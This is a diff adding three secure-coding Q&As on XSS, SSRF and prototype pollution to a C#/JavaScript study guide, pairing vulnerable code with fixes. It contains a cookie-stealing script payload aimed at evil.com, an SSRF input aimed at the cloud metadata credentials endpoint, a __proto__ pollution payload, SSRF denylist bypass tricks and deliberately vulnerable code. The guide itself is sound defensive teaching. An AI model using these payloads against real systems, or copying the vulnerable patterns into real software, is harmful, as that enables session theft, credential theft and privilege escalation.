@@ -638,3 +638,97 @@ By expressing the check (`Balance >= amount`) as part of the *same atomic* `UPDA
 **Common Pitfall:** attempting to "fix" a TOCTOU race by adding an in-application `lock` statement around the check-then-act sequence — a plain in-process `lock` only serializes access *within a single server process*; in any horizontally-scaled deployment (multiple server instances, the default for any application designed for real-world load, per the earlier horizontal scaling discussion), a `lock` on one instance does nothing to prevent a *different* instance from concurrently executing the same check-then-act race — genuine protection requires either a database-level atomic operation (as shown above) or a genuinely distributed lock (covered earlier for the distributed billing-job scenario), not an in-process-only synchronization primitive.
 
 ---
+
+## Beginner — Question 6
+
+**Q6: What is Cross-Site Scripting (XSS), and what specific mechanism (encoding user input on output) prevents an attacker's injected `<script>` tag from actually executing in a victim's browser?**
+
+XSS occurs when an application includes untrusted, attacker-supplied input directly in a page's HTML without properly encoding it — a browser cannot distinguish "legitimate page markup" from "attacker-injected markup" once both are concatenated into the same raw HTML string, so if an attacker's input contains `<script>`, the browser parses and executes it exactly as if the site's own developer had written it.
+
+```csharp
+// VULNERABLE -- user input concatenated DIRECTLY into raw HTML, with no encoding at all
+var html = $"<div>Welcome, {userSuppliedName}</div>";
+// If userSuppliedName is "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+// the browser executes that script AS IF it were part of the legitimate page
+```
+```csharp
+// SAFE -- HTML-encoding converts dangerous characters into inert, literal text equivalents
+var safeHtml = $"<div>Welcome, {HtmlEncoder.Default.Encode(userSuppliedName)}</div>";
+// Renders LITERALLY as the text "<script>...</script>" on the page -- NOT executed, just displayed as text
+```
+HTML encoding converts characters with special meaning in HTML (`<`, `>`, `&`, `"`) into their literal, harmless text equivalents (`&lt;`, `&gt;`, etc.) — the browser then renders the encoded input as plain, inert *text* rather than parsing it as executable markup, since the characters that would have made it "look like" a tag to the browser's HTML parser have been neutralized.
+
+**Common Pitfall:** relying on manual, ad-hoc encoding calls scattered throughout the codebase rather than a templating engine/framework that encodes output *by default* (Razor, for instance, HTML-encodes automatically unless explicitly told not to via `Html.Raw`) — a single forgotten manual encoding call anywhere untrusted input reaches HTML output is enough to reintroduce the vulnerability; framework-level automatic encoding-by-default is a meaningfully more reliable defense than expecting every developer to remember every individual encoding call correctly, everywhere, forever.
+
+---
+
+## Intermediate — Question 7
+
+**Q7: What is "Server-Side Request Forgery" (SSRF), and how does it let an attacker trick a SERVER into making requests to internal, otherwise-unreachable resources on the attacker's behalf?**
+
+SSRF occurs when an application accepts a URL from user input and then has the *server itself* fetch that URL — if the server doesn't restrict which URLs it's willing to fetch, an attacker can supply an internal address (a cloud metadata endpoint, an internal admin panel, a database only reachable from inside the network) that the server, sitting inside the trusted internal network, can reach even though the attacker's own browser never could directly.
+
+```csharp
+// VULNERABLE -- fetches WHATEVER URL the user supplies, with no restriction at all
+[HttpPost("fetch-preview")]
+public async Task<IActionResult> FetchUrlPreview(string url)
+{
+    var response = await _httpClient.GetStringAsync(url); // the SERVER makes this request, not the attacker
+    return Ok(response);
+}
+```
+```text
+Attacker submits: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+-- this is a CLOUD METADATA endpoint, reachable ONLY from within the cloud VM/container itself --
+-- the attacker's OWN browser could never reach this address directly, but the SERVER can, and does --
+-- the response (potentially containing cloud credentials) is returned to the attacker via the app's own response
+```
+The server, running inside the cloud provider's internal network, can reach the cloud metadata endpoint that issues temporary credentials for the VM/container's own assigned identity — an attacker who can make the *server* fetch an arbitrary URL of their choosing can direct it to fetch this normally-unreachable internal resource and relay the (potentially highly sensitive) response back to them, entirely through the vulnerable "URL fetching" feature.
+
+**The mitigation — validate against an explicit ALLOWLIST of permitted destinations, never a denylist:**
+```csharp
+var allowedHosts = new[] { "api.trusted-partner.com", "cdn.trusted-partner.com" };
+var uri = new Uri(url);
+if (!allowedHosts.Contains(uri.Host)) return BadRequest("URL not permitted");
+```
+A denylist (blocking known-bad addresses like `169.254.169.254` or `localhost`) is fragile and easy to bypass (alternate IP representations, DNS rebinding, redirects to a blocked address after the initial check passes) — an allowlist of specifically-permitted destination hosts is the only robust mitigation, since it defaults to rejecting everything not explicitly approved, rather than trying to enumerate every possible dangerous destination.
+
+**Common Pitfall:** implementing SSRF protection as a denylist checking for `localhost`/`127.0.0.1`/known internal IP ranges — attackers have numerous bypass techniques (alternate IP notations like decimal/octal representations, DNS names that resolve to an internal IP, HTTP redirects from an initially-allowed URL to a disallowed internal one) that a denylist checked only once, upfront, often fails to catch; genuine SSRF protection requires an allowlist approach, and re-validating the *actual resolved destination* at request time, not just the URL string as initially submitted.
+
+---
+
+## Advanced — Question 6
+
+**Q6: What is a "Prototype Pollution" vulnerability (common in JavaScript/Node.js), and how does polluting `Object.prototype` let an attacker inject properties into EVERY object across an entire application, not just one specific object?**
+
+In JavaScript, nearly every object inherits from `Object.prototype` by default — if an attacker can manipulate code (often a recursive merge/clone utility) into writing a property onto `Object.prototype` itself (rather than onto the specific object intended), that injected property becomes visible on **every** object in the entire application, since they all inherit from that same shared prototype.
+
+```javascript
+// A naive recursive merge function, vulnerable to prototype pollution:
+function merge(target, source) {
+    for (const key in source) {
+        if (typeof source[key] === 'object') {
+            target[key] = merge(target[key] || {}, source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+    return target;
+}
+
+// Attacker-supplied JSON input:
+const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
+merge({}, malicious);
+// __proto__ is a special property referencing Object.prototype itself --
+// this WRITES isAdmin=true onto Object.prototype, affecting EVERY object, EVERYWHERE
+
+const anyRandomObject = {};
+console.log(anyRandomObject.isAdmin); // true !! -- even though isAdmin was NEVER set on this specific object
+```
+Because `__proto__` is a special accessor referring to an object's own prototype, a merge function that doesn't specifically guard against writing to keys named `__proto__`, `constructor`, or `prototype` can be tricked into writing attacker-controlled data directly onto the shared `Object.prototype` — from that point forward, *every* plain object in the running application (including ones created long after the pollution, completely unrelated to the original vulnerable code path) inherits the attacker's injected property.
+
+**Why this can escalate into serious vulnerabilities beyond just "an unexpected property exists":** if application logic anywhere checks `if (user.isAdmin)` and `user` happens to be a plain object without its own `isAdmin` property explicitly set, JavaScript's prototype chain lookup falls through to the polluted `Object.prototype.isAdmin`, silently granting admin-level behavior to a user object that was never actually supposed to have it — the pollution's damage isn't confined to the object that was originally merged, it potentially affects unrelated logic anywhere in the entire application that happens to check for a similarly-named property.
+
+**Common Pitfall:** writing a "safe-looking" recursive merge/clone/extend utility that filters user input for obviously dangerous top-level keys but misses that `__proto__` can also appear *nested* inside a deeply nested object structure, or that `constructor.prototype` provides an alternate path to the same prototype object — robust protection requires explicitly blocking `__proto__`, `constructor`, and `prototype` as forbidden keys at every level of recursion, or using a merge utility from a library specifically hardened against and tested for this exact vulnerability class, rather than trusting a hand-rolled recursive merge function to have anticipated every bypass technique.
+
+---
